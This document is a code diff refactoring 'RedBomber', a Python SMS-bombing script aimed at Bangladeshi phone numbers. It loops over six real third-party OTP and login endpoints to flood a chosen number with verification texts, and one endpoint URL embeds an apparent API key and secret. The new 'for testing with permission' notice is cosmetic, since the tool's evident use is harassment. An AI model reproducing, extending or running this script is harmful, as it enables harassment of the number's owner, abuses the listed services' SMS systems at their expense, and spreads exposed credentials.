@@ -1,144 +1,157 @@
 import requests
-
 from requests.structures import CaseInsensitiveDict
-
-import os
-
-import sys
-
 import time
+import re
+from colorama import init, Fore, Style
 
-os.system("pip install requests")
+# Initialize colorama for cross-platform colored output
+init()
 
-os.system("clear")
+# Color definitions
+RED = Fore.RED
+CYAN = Fore.CYAN
+GREEN = Fore.GREEN
+YELLOW = Fore.YELLOW
+RESET = Style.RESET_ALL
 
-red="\033[0;31m"          # Red
-
-yellow="\033[0;33m"       # Yellow
-
-green="\033[0;32m"        # Green
-
-color_off="\033[0m"       # Text Reset
-
-bblack="\033[1;30m"       # Black
-
-bred="\033[1;31m"         # Red
-
-ured="\033[4;31m"         # Red
-
-on_green="\033[42m"       # Green
-
-blue="\033[0;34m"         # Blue
-
-lightblue = '\033[94m'
-
-red = '\033[91m'
-
-white = '\33[97m'
-
-yellow = '\33[93m'
-
-green = '\033[1;32m'
-
-cyan  = "\033[96m"
-
-end = '\033[0m'
-
-purple="\033[0;35m"
-
-logo=(green+""" 
-
-
+# ASCII logo and details
+LOGO = GREEN + """
 ██████╗░███████╗██████╗░██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
 ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
 ██████╔╝█████╗░░██║░░██║██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
 ██╔══██╗██╔══╝░░██║░░██║██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
 ██║░░██║███████╗██████╔╝██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
-╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ """)
-                                                  
+╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
+""" + RESET
+LINE = YELLOW + "=" * 54 + RESET
+TVERSION = CYAN + "\t\t   Version : 1.0.1 " + RESET
+DTLS = YELLOW + "\t\t Created By: Redwiat " + RESET
+NOTE = CYAN + "Note: For testing in Bangladesh only. Ensure you have permission to test on the target number." + RESET
 
+# Print banner
+print(LOGO)
+print(DTLS)
+print(TVERSION)
+print(LINE)
+print(NOTE)
+print(LINE)
+print()
 
+# Validate Bangladesh phone number (e.g., +8801XXXXXXXXX or 01XXXXXXXXX)
+def is_valid_bd_number(number):
+    pattern = r"^(?:\+8801|01)[3-9]\d{8}$"
+    return bool(re.match(pattern, number))
 
-line=(yellow+"======================================================")
-tversion=(cyan+"\t\t   Version : 1.0.1 ")
+# API configurations
+API_LIST = [
+    {
+        "url": "https://ss.binge.buzz/otp/send/login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda num: f"phone={num}"
+    },
+    {
+        "url": lambda num: f"https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{num}&platform=app&activity=login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "Content-Length": "0"},
+        "data": None
+    },
+    {
+        "url": lambda num: f"https://stage.bioscopelive.com/en/login/send-otp?phone=88{num}&operator=bd-otp",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "url": "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda num: f'{{"mobile":"{num}"}}'
+    },
+    {
+        "url": "https://addabaji.mobi/twocups-v1-robi/otp.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda num: f"msisdn={num}"
+    },
+    {
+        "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda num: f'{{"phone":"{num}","country_code":"+880","fcm_token":null}}'
+    }
+]
 
-line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")
- 
-dtls=(yellow+"\t\t Created By: Redwiat ")
+# Main function
+def send_otp_requests(number, amount):
+    print()
+    for i in range(amount):
+        print(f"{CYAN}Attempt {i+1}/{amount}:{RESET}")
+        for api in API_LIST:
+            try:
+                url = api["url"](number) if callable(api["url"]) else api["url"]
+                method = api["method"].lower()
+                headers = CaseInsensitiveDict(api["headers"])
+                data = api["data"](number) if api["data"] else None
 
-note=(cyan+"Note: I wont be responsible fo any illigal activites. >> This RedBomber tool is for use in Bangladesh only. Use our Global version for worldwide use.")
+                # Send request based on method
+                if method == "post":
+                    response = requests.post(url, headers=headers, data=data, timeout=10)
+                elif method == "get":
+                    response = requests.get(url, headers=headers, timeout=10)
+                else:
+                    print(f"  {RED}Unsupported method for {url}{RESET}")
+                    continue
 
-print(logo)
+                # Check response status
+                if response.status_code in [200, 201, 202]:
+                    print(f"  {GREEN}SMS Sent to {url} ✅{RESET}")
+                else:
+                    print(f"  {RED}Failed to send SMS to {url} (Status: {response.status_code}){RESET}")
 
-print(" ")
+            except requests.RequestException as e:
+                print(f"  {RED}Error sending to {url}: {str(e)}{RESET}")
 
-print(dtls)
+            # Small delay to avoid overwhelming APIs
+            time.sleep(0.5)
 
-print(tversion)
+        # Delay between rounds
+        time.sleep(1)
 
-print(line)
+    print()
+    print(CYAN + "\t\tTesting Complete. Thanks for using RedBomber!" + RESET)
 
-print(note)
+# Input and validation
+def main():
+    try:
+        number = input(RED + "[➙] Enter Your Number (e.g., +8801XXXXXXXXX or 01XXXXXXXXX): " + RESET)
+        if not is_valid_bd_number(number):
+            print(RED + "Invalid Bangladesh phone number! Must start with +8801 or 01 and be 11 digits." + RESET)
+            return
 
-print(line)
+        amount = input(CYAN + "[➙] Enter The Amount: " + RESET)
+        if not amount.isdigit() or int(amount) <= 0:
+            print(RED + "Amount must be a positive integer!" + RESET)
+            return
+        amount = int(amount)
 
+        # Normalize number (remove +88 if present)
+        if number.startswith("+88"):
+            number = number[3:]
 
+        send_otp_requests(number, amount)
 
+    except KeyboardInterrupt:
+        print(RED + "\nProcess interrupted by user." + RESET)
+    except Exception as e:
+        print(RED + f"An error occurred: {str(e)}" + RESET)
 
+if __name__ == "__main__":
+    # Check if requests is installed
+    try:
+        import requests
+    except ImportError:
+        print(RED + "The 'requests' module is not installed. Please install it using 'pip install requests'." + RESET)
+        exit(1)
 
-print(' ')
-
-number=str(input(red+"[➙] Enter Your Number : "))
-amount=int(input(cyan+"[➙] Enter The Amount : "))
-
-url1 = "https://ss.binge.buzz/otp/send/login"
-
-headers1 = CaseInsensitiveDict()
-headers1["Content-Type"] = "application/x-www-form-urlencoded"
-
-data1 = "phone="+number
-
-
-
-url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
-
-headers2 = CaseInsensitiveDict()
-headers2["Content-Type"] = "application/json"
-headers2["Content-Length"] = "0"
-
-
-url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
-
-url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"
-
-headers4 = CaseInsensitiveDict()
-headers4["Content-Type"] = "application/json"
-
-data4 = '{\"mobile\":\"'+number+'\"}'
-
-url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"
-
-headers5 = CaseInsensitiveDict()
-headers5["Content-Type"] = "application/x-www-form-urlencoded"
-
-data5 = "msisdn="+number
-
-url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
-headers6 = CaseInsensitiveDict()
-headers6["Content-Type"] = "application/json"
-
-data6 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'
-
-for i in range (amount):
-	resp1 = requests.post(url1, headers=headers1, data=data1)
-	resp2 = requests.post(url2, headers=headers2)
-	resp3 = requests.get(url3)
-	resp4 = requests.post(url4, headers=headers4,data=data4)
-	resp5 = requests.post(url5, headers=headers5, data=data5)
-	resp = requests.post(url6, headers=headers6, data=data6)	
-	print(str(i+1)+green+'.	➙SMS Sent 😈✅')
-	
-print('					')
-print(cyan+'\t\tThanks For Using RedBomber Bangladesh By Redwiat - RedHunter Team')
-
-
+    main()
